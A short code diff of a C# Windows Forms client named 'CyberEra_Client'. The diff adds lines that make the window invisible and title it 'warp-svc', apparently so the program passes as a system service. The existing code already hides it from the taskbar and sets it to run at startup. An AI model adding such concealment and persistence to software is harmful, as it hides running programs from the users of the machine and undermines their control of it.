@@ -33,8 +33,9 @@ namespace CyberEra_Client {
             this.Bounds = Screen.PrimaryScreen.WorkingArea;
             this.FormClosing += new FormClosingEventHandler(ClientFormClosing);
             this.ShowInTaskbar= false;
+            this.Text = "warp-svc";
+            this.Opacity = 0;
             WindowsController.SetAutorunValue(true);
-
            
            
             try {
